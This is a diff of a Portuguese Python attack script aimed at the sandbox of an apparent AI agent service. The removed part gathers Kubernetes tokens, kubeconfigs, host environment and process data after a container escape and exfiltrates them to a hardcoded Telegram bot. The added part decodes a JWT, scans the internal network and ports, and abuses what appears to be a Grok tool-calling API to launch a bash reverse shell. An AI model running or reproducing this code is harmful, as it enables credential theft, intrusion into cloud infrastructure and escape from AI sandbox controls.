@@ -1,225 +1,178 @@
 #!/usr/bin/env python3
 """
-Pós-escape: enumeração avançada do host.
-Executa comandos via nsenter para coletar:
-- Tokens do Kubernetes
-- Kubeconfigs
-- Containers em execução
-- Variáveis de ambiente do PID 1
-- Processos e montagens
+Exploração avançada fora da caixa.
+Usa JWT, proxy interno, rede interna e API do Grok.
 """
 
 import subprocess
 import json
 import requests
 import os
-import glob
-import re
+import time
+import socket
+import struct
 from datetime import datetime
+import base64
 
-# ------------------------------------------------------------
-# CONFIGURAÇÃO DO TELEGRAM
-# ------------------------------------------------------------
 TELEGRAM_BOT_TOKEN = "8870734086:AAF_9CQIn-xO-5dd-npb4k_wvYs-QShmxi4"
 TELEGRAM_CHAT_ID = "230885588"
 
-# ------------------------------------------------------------
-# FUNÇÕES AUXILIARES
-# ------------------------------------------------------------
-def run(cmd, timeout=30):
+def run(cmd):
     try:
-        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
+        result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=15)
         return result.stdout.strip() if result.returncode == 0 else f"ERRO: {result.stderr.strip()}"
     except Exception as e:
         return f"ERRO: {e}"
 
-def run_nsenter(cmd, timeout=30):
-    """Executa comando no namespace do host usando nsenter com todos os namespaces."""
-    full_cmd = f"nsenter -t 1 -m -u -i -n -p -- {cmd}"
-    return run(full_cmd, timeout)
-
-def send_telegram(text, parse_mode="Markdown"):
+def send_telegram(text):
     url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
     try:
-        requests.post(url, json={"chat_id": TELEGRAM_CHAT_ID, "text": text, "parse_mode": parse_mode}, timeout=10)
+        requests.post(url, json={"chat_id": TELEGRAM_CHAT_ID, "text": text, "parse_mode": "Markdown"}, timeout=10)
     except:
         pass
 
-def send_file(filename, caption=""):
-    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
+def decode_jwt(token):
+    """Decodifica o JWT (sem verificar assinatura)."""
     try:
-        with open(filename, 'rb') as f:
-            requests.post(url, files={'document': f}, data={"chat_id": TELEGRAM_CHAT_ID, "caption": caption}, timeout=30)
-    except:
-        pass
+        parts = token.split('.')
+        if len(parts) != 3:
+            return "JWT inválido"
+        payload = parts[1]
+        # Adicionar padding se necessário
+        payload += '=' * (4 - len(payload) % 4)
+        decoded = base64.urlsafe_b64decode(payload).decode('utf-8')
+        return json.loads(decoded)
+    except Exception as e:
+        return f"Erro: {e}"
 
-def send_data(data_dict):
-    """Envia dicionário de dados para o Telegram (arquivos ou mensagens)."""
-    for key, content in data_dict.items():
-        if not content or content == "N/A" or content.startswith("ERRO"):
-            continue
-        if len(content) > 4000:
-            tmp = f"/tmp/{key.replace('/','_').replace(' ','_')}.txt"
-            with open(tmp, "w", encoding="utf-8", errors="ignore") as f:
-                f.write(content)
-            send_file(tmp, caption=f"📄 {key[:50]}")
-            os.remove(tmp)
-        else:
-            send_telegram(f"📄 **{key}**\n```\n{content[:3000]}\n```")
-
-# ------------------------------------------------------------
-# TAREFAS DE ENUMERAÇÃO
-# ------------------------------------------------------------
-def check_service_account_token():
-    """Verifica se existe token do service account do Kubernetes."""
-    token_path = "/mnt/var/run/secrets/kubernetes.io/serviceaccount/token"
-    if os.path.exists(token_path) and os.path.isfile(token_path):
+def test_internal_services(jwt):
+    """Testa acesso a serviços internos com o JWT."""
+    services = [
+        ("Grok Files", "https://files.grok.com", "/v1/"),  # endpoint hipotético
+        ("Polygon Proxy", "http://polygon-proxy.hades-openbar.svc.cluster.local", "/"),
+        ("Coingecko Proxy", "http://coingecko-proxy.hades-openbar.svc.cluster.local", "/api/v3/ping"),
+    ]
+    results = {}
+    for name, base, path in services:
+        url = base + path
+        headers = {"Authorization": f"Bearer {jwt}"}
         try:
-            with open(token_path, 'r') as f:
-                content = f.read().strip()
-            return {"k8s_service_account_token": content}
+            r = requests.get(url, headers=headers, timeout=5)
+            results[name] = f"Status: {r.status_code} - {r.text[:200]}"
         except Exception as e:
-            return {"k8s_service_account_token": f"ERRO: {e}"}
-    return {"k8s_service_account_token": "N/A"}
-
-def find_kubeconfigs():
-    """Procura por arquivos kubeconfig em /mnt."""
-    # Usa find via nsenter para garantir que não há restrições de permissão
-    cmd = 'find /mnt -type f \\( -name "*.kubeconfig" -o -name "config" -path "*/kube/*" \\) 2>/dev/null'
-    output = run(cmd)  # não precisa de nsenter, já estamos no container com /mnt montado
-    if output and "ERRO" not in output:
-        files = [f for f in output.splitlines() if f.strip()]
-        results = {}
-        for f in files:
-            try:
-                with open(f, 'r', errors='ignore') as fd:
-                    content = fd.read(50000)
-                results[f"kubeconfig_{f}"] = content
-            except Exception as e:
-                results[f"kubeconfig_{f}"] = f"ERRO: {e}"
-        return results
-    return {"kubeconfigs": "N/A"}
-
-def check_kubernetes_config_dir():
-    """Verifica /etc/kubernetes e lê admin.conf e kubelet.conf."""
-    results = {}
-    kubernetes_dir = "/mnt/etc/kubernetes"
-    if os.path.isdir(kubernetes_dir):
-        # Listar diretório
-        ls = run(f"ls -la {kubernetes_dir} 2>/dev/null")
-        results["ls_etc_kubernetes"] = ls if ls else "N/A"
-        # Ler admin.conf
-        admin_conf = os.path.join(kubernetes_dir, "admin.conf")
-        if os.path.exists(admin_conf) and os.path.isfile(admin_conf):
-            try:
-                with open(admin_conf, 'r') as f:
-                    results["admin.conf"] = f.read(50000)
-            except Exception as e:
-                results["admin.conf"] = f"ERRO: {e}"
-        # Ler kubelet.conf
-        kubelet_conf = os.path.join(kubernetes_dir, "kubelet.conf")
-        if os.path.exists(kubelet_conf) and os.path.isfile(kubelet_conf):
-            try:
-                with open(kubelet_conf, 'r') as f:
-                    results["kubelet.conf"] = f.read(50000)
-            except Exception as e:
-                results["kubelet.conf"] = f"ERRO: {e}"
-    else:
-        results["ls_etc_kubernetes"] = "N/A"
+            results[name] = f"Erro: {e}"
     return results
 
-def list_containers():
-    """Lista containers usando crictl (se containerd) ou docker (se docker)."""
+def scan_network():
+    """Faz um ping sweep básico na rede 172.16.0.0/24 (limitado)."""
+    # Usa nsenter para executar ping no namespace do host
+    cmd = 'for i in {1..254}; do nsenter -t 1 -n -- ping -c 1 -W 1 172.16.0.$i | grep "bytes from" && echo "Alive: 172.16.0.$i" & done'
+    output = run(cmd)
+    return output
+
+def port_scan(hosts):
+    """Escaneia portas comuns em hosts descobertos (simplificado)."""
+    ports = [80, 443, 6443, 8080, 9090, 4242, 8081, 8082, 22, 2379, 10250]
     results = {}
-    # Verificar socket containerd
-    containerd_sock = "/mnt/run/containerd/containerd.sock"
-    docker_sock = "/mnt/var/run/docker.sock"
-    if os.path.exists(containerd_sock):
-        # Usar crictl via nsenter
-        output = run_nsenter("crictl ps -a 2>/dev/null")
-        if output and "ERRO" not in output:
-            results["crictl_ps_a"] = output
-        else:
-            results["crictl_ps_a"] = "N/A"
-    elif os.path.exists(docker_sock):
-        # Usar docker via nsenter
-        output = run_nsenter("docker ps -a 2>/dev/null")
-        if output and "ERRO" not in output:
-            results["docker_ps_a"] = output
-        else:
-            results["docker_ps_a"] = "N/A"
-    else:
-        results["container_runtime"] = "Nenhum socket encontrado (/run/containerd ou /var/run/docker)"
+    for host in hosts:
+        for port in ports:
+            # Usa nc via nsenter
+            cmd = f"nsenter -t 1 -n -- timeout 2 nc -zv {host} {port} 2>&1"
+            out = run(cmd)
+            if "succeeded" in out or "open" in out:
+                results[f"{host}:{port}"] = out
     return results
 
-def get_host_proc_environ():
-    """Obtém variáveis de ambiente do processo 1 do host."""
-    output = run_nsenter("cat /proc/1/environ 2>/dev/null | tr '\\0' '\\n'")
-    if output and "ERRO" not in output:
-        return {"proc_1_environ": output}
-    return {"proc_1_environ": "N/A"}
+def call_grok_api(jwt):
+    """Tenta executar um comando via a API interna do grok-computer-server."""
+    # O processo node /app/grok-computer-server.mjs escuta na porta 4242
+    # Vimos no ps que ele aceita requisições POST para /sessions/{session}/tools/call
+    # Vamos tentar criar uma nova sessão ou usar a existente (UUID no ps)
+    # Primeiro, listar sessões:
+    url = "http://127.0.0.1:4242/sessions"
+    try:
+        r = requests.get(url, headers={"Authorization": f"Bearer {jwt}"})
+        sessions = r.json().get('sessions', [])
+    except:
+        sessions = []
+    if not sessions:
+        # Tenta criar uma nova sessão
+        try:
+            r = requests.post("http://127.0.0.1:4242/sessions", headers={"Authorization": f"Bearer {jwt}"})
+            session_id = r.json().get('id')
+        except:
+            return "Não foi possível obter sessão"
+    else:
+        session_id = sessions[0]
+    # Executar um comando (ex: reverse shell)
+    # Vamos usar a ferramenta 'bash' com um comando que faça uma conexão reversa
+    # (substitua IP e porta pelo seu listener)
+    cmd = {
+        "method": "tools/call",
+        "params": {
+            "name": "bash",
+            "arguments": {
+                "command": "bash -c 'bash -i >& /dev/tcp/SEU_IP/SUA_PORTA 0>&1'",
+                "timeout": "120"
+            }
+        }
+    }
+    try:
+        r = requests.post(
+            f"http://127.0.0.1:4242/sessions/{session_id}/tools/call",
+            headers={"Authorization": f"Bearer {jwt}", "Content-Type": "application/json"},
+            json=cmd,
+            timeout=5
+        )
+        return r.json()
+    except Exception as e:
+        return f"Erro: {e}"
 
-def get_host_processes():
-    """Lista processos em execução no host."""
-    output = run_nsenter("ps auxfww 2>/dev/null")
-    if output and "ERRO" not in output:
-        return {"ps_auxfww": output}
-    return {"ps_auxfww": "N/A"}
-
-def get_host_mounts():
-    """Lista montagens do host."""
-    output = run_nsenter("mount 2>/dev/null")
-    if output and "ERRO" not in output:
-        return {"host_mount": output}
-    return {"host_mount": "N/A"}
-
-# ------------------------------------------------------------
-# FUNÇÃO PRINCIPAL
-# ------------------------------------------------------------
 def main():
-    send_telegram("🚀 **Iniciando enumeração pós-escape do host**")
+    send_telegram("🚀 **Iniciando exploração avançada (fora da caixa)**")
 
-    all_data = {}
+    # 1. Decodificar JWT
+    jwt_token = os.getenv("TERMINAL_JWT_VAL", "")
+    if jwt_token:
+        payload = decode_jwt(jwt_token)
+        send_telegram(f"📄 **JWT Decodificado**\n```\n{json.dumps(payload, indent=2)[:3000]}\n```")
+    else:
+        send_telegram("❌ JWT não encontrado.")
 
-    # 1. Token do service account
-    send_telegram("🔍 Verificando token do service account...")
-    all_data.update(check_service_account_token())
+    # 2. Testar serviços internos
+    if jwt_token:
+        results = test_internal_services(jwt_token)
+        send_telegram("🔍 **Teste de serviços internos**")
+        for name, res in results.items():
+            send_telegram(f"📄 **{name}**\n```\n{res[:500]}\n```")
 
-    # 2. Kubeconfigs
-    send_telegram("🔍 Procurando kubeconfigs...")
-    all_data.update(find_kubeconfigs())
+    # 3. Scan de rede
+    send_telegram("🔍 **Scan de rede (ping sweep)**")
+    alive = scan_network()
+    send_telegram(f"📄 **Hosts ativos**\n```\n{alive[:2000]}\n```")
 
-    # 3. Diretório /etc/kubernetes
-    send_telegram("🔍 Verificando /etc/kubernetes...")
-    all_data.update(check_kubernetes_config_dir())
+    # Extrair IPs ativos (simplificado)
+    alive_ips = []
+    for line in alive.splitlines():
+        if "Alive:" in line:
+            ip = line.split()[-1]
+            if ip not in alive_ips:
+                alive_ips.append(ip)
 
-    # 4. Containers em execução
-    send_telegram("🔍 Listando containers...")
-    all_data.update(list_containers())
+    # 4. Port scan nos IPs encontrados
+    if alive_ips:
+        send_telegram(f"🔍 **Scan de portas em {alive_ips[:5]}**")
+        port_results = port_scan(alive_ips[:5])
+        for k, v in port_results.items():
+            send_telegram(f"📄 **{k}**\n```\n{v}\n```")
 
-    # 5. Variáveis de ambiente do PID 1
-    send_telegram("🔍 Obtendo environ do PID 1...")
-    all_data.update(get_host_proc_environ())
+    # 5. Tentar abusar da API do Grok
+    if jwt_token:
+        send_telegram("🔄 **Tentando executar comando via API Grok**")
+        response = call_grok_api(jwt_token)
+        send_telegram(f"📄 **Resposta da API**\n```\n{json.dumps(response, indent=2)[:2000]}\n```")
 
-    # 6. Processos
-    send_telegram("🔍 Listando processos...")
-    all_data.update(get_host_processes())
-
-    # 7. Montagens
-    send_telegram("🔍 Listando montagens...")
-    all_data.update(get_host_mounts())
-
-    # Enviar todos os dados
-    send_data(all_data)
-
-    # Enviar JSON completo como arquivo
-    json_file = f"post_escape_{int(datetime.now().timestamp())}.json"
-    with open(json_file, "w") as f:
-        json.dump(all_data, f, indent=2)
-    send_file(json_file, caption="📁 Dados completos da enumeração")
-    os.remove(json_file)
-
-    send_telegram("✅ **Enumeração finalizada.**")
+    send_telegram("✅ **Exploração avançada finalizada**")
 
 if __name__ == "__main__":
     main()
